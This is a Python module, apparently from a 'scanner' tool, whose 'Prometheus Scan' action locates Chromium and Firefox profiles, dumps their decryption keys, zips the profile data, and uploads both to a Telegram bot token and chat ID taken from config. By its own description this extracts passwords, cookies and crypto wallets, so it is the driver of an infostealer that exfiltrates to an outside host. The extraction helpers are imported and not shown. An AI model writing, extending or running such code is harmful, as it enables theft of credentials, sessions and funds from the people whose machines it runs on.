# -*- coding: utf-8 -*-
"""Prometheus Scan Action — Browser data and crypto wallet extraction."""

import os
import sys
import json
import base64
import tempfile
import zipfile
import shutil
import threading
import time
from pathlib import Path
from datetime import datetime

from rich.table import Table
from rich.panel import Panel
from rich import box
from rich.progress import Progress, SpinnerColumn, TextColumn, BarColumn

from scanner.ui import console, print_success, print_error, print_info, print_warning
from scanner.ui import show_simple_list


def action_prometheus_scan(cfg):
    """Run Prometheus browser data and crypto wallet extraction."""
    print_info("🔐 Starting Prometheus Scan...")
    print_info("Extracts browser data, crypto wallets, and system info.")
    
    # Check if Prometheus is enabled
    prom_config = cfg.get("prometheus", {})
    if not prom_config.get("enabled", True):
        print_warning("Prometheus is disabled in config. Enable by setting prometheus.enabled=true")
        return
    
    # Get Telegram config if available
    bot_token = prom_config.get("telegram_bot_token", "")
    chat_id = prom_config.get("telegram_chat_id", "")
    
    # Show warning
    print_warning("This will extract browser data including passwords, cookies, and crypto wallets.")
    console.print("[dim]Press Ctrl+C to cancel, or wait 5 seconds to continue...[/]")
    time.sleep(5)
    
    try:
        # Initialize the Prometheus core
        from prometheus.core.cross_host import (
            dump_keys,
            archive_profile,
            find_browser_profiles,
            find_firefox_profiles,
            setup_logging,
            IS_WINDOWS,
            IS_LINUX,
        )
        from prometheus.core.telegram_runner import send_telegram_message
        
        print_info("Prometheus core loaded successfully")
        
        # Check platform
        if not IS_WINDOWS:
            print_warning("Running on non-Windows platform. Some features may be limited.")
        
        # Find browser profiles
        print_info("Scanning for browser profiles...")
        profiles = find_browser_profiles()
        firefox_profiles = find_firefox_profiles()
        
        total_profiles = len(profiles) + len(firefox_profiles)
        if total_profiles == 0:
            print_error("No browser profiles found.")
            return
        
        print_success(f"Found {len(profiles)} Chromium profiles and {len(firefox_profiles)} Firefox profiles")
        
        # Create temp directory
        temp_dir = tempfile.mkdtemp(prefix="prometheus_scan_")
        results = []
        
        with Progress(
            SpinnerColumn(),
            TextColumn("[bold cyan]{task.description}"),
            BarColumn(bar_width=40, complete_style="cyan", finished_style="bright_green"),
            console=console,
        ) as progress:
            
            # Process Chromium profiles
            for profile in profiles:
                task = progress.add_task(f"[cyan]Processing {profile['browser']}/{profile['name']}...", total=1)
                
                try:
                    profile_path = profile["path"]
                    browser = profile["browser"]
                    name = profile["name"]
                    
                    # Dump keys
                    keys_data = dump_keys(profile_path)
                    keys_json = os.path.join(temp_dir, f"{browser}_{name}_keys.json")
                    with open(keys_json, "w") as f:
                        json.dump(keys_data.to_dict(), f, indent=2)
                    
                    # Archive data
                    archive_path = os.path.join(temp_dir, f"{browser}_{name}_data.zip")
                    count = archive_profile(profile_path, archive_path)
                    
                    results.append({
                        "browser": browser,
                        "profile": name,
                        "keys": keys_json,
                        "archive": archive_path,
                        "file_count": count,
                        "size": os.path.getsize(archive_path) if os.path.exists(archive_path) else 0,
                    })
                    
                    progress.update(task, completed=1)
                    
                except Exception as e:
                    progress.update(task, completed=1)
                    print_error(f"Failed to process {profile['browser']}/{profile['name']}: {e}")
            
            # Process Firefox profiles
            for profile_path in firefox_profiles:
                task = progress.add_task(f"[cyan]Processing Firefox/{Path(profile_path).name}...", total=1)
                
                try:
                    # Firefox uses a different profile path structure
                    profile_name = Path(profile_path).name
                    browser = "firefox"
                    
                    # Dump keys
                    keys_data = dump_keys(profile_path, "firefox")
                    keys_json = os.path.join(temp_dir, f"{browser}_{profile_name}_keys.json")
                    with open(keys_json, "w") as f:
                        json.dump(keys_data.to_dict(), f, indent=2)
                    
                    # Archive data
                    archive_path = os.path.join(temp_dir, f"{browser}_{profile_name}_data.zip")
                    count = archive_profile(profile_path, archive_path, browser_type="firefox")
                    
                    results.append({
                        "browser": browser,
                        "profile": profile_name,
                        "keys": keys_json,
                        "archive": archive_path,
                        "file_count": count,
                        "size": os.path.getsize(archive_path) if os.path.exists(archive_path) else 0,
                    })
                    
                    progress.update(task, completed=1)
                    
                except Exception as e:
                    progress.update(task, completed=1)
                    print_error(f"Failed to process Firefox/{Path(profile_path).name}: {e}")
        
        # Display results
        if results:
            table = Table(
                title="[bold cyan]Prometheus Scan Results[/bold cyan]",
                box=box.DOUBLE_EDGE,
                border_style="cyan",
            )
            table.add_column("Browser", style="bold white", width=12)
            table.add_column("Profile", style="dim", width=20)
            table.add_column("Files", justify="center", style="yellow", width=8)
            table.add_column("Size", justify="right", style="green", width=12)
            table.add_column("Keys", style="cyan", width=30)
            
            for r in results:
                size_mb = r["size"] / (1024 * 1024)
                table.add_row(
                    r["browser"],
                    r["profile"],
                    str(r["file_count"]),
                    f"{size_mb:.2f} MB",
                    os.path.basename(r["keys"]),
                )
            
            console.print()
            console.print(table)
            console.print()
            
            # Send to Telegram if configured
            if bot_token and chat_id:
                print_info("Sending results to Telegram...")
                for r in results:
                    if os.path.exists(r["keys"]):
                        send_telegram_message(bot_token, chat_id, f"Keys for {r['browser']}/{r['profile']}", r["keys"])
                    if os.path.exists(r["archive"]) and os.path.getsize(r["archive"]) < 50 * 1024 * 1024:
                        send_telegram_message(bot_token, chat_id, f"Data for {r['browser']}/{r['profile']}", r["archive"])
                print_success("Results sent to Telegram")
            
            # Save summary
            summary_path = os.path.join(temp_dir, "prometheus_summary.json")
            with open(summary_path, "w") as f:
                json.dump({
                    "timestamp": datetime.now().isoformat(),
                    "results": results,
                    "temp_dir": temp_dir,
                }, f, indent=2)
            
            print_success(f"Results saved to: {temp_dir}")
            print_info(f"Summary: {summary_path}")
            
            # Offer to open the directory
            if sys.platform == "win32":
                os.startfile(temp_dir)
            elif sys.platform == "darwin":
                os.system(f'open "{temp_dir}"')
            else:
                os.system(f'xdg-open "{temp_dir}"')
        else:
            print_error("No results were collected.")
            shutil.rmtree(temp_dir, ignore_errors=True)
            
    except ImportError as e:
        print_error(f"Failed to import Prometheus core: {e}")
        print_info("Make sure prometheus/ is in the Python path")
        print_info("Run: export PYTHONPATH=$PYTHONPATH:./prometheus")
    except Exception as e:
        print_error(f"Prometheus scan failed: {e}")
        import traceback
        traceback.print_exc()
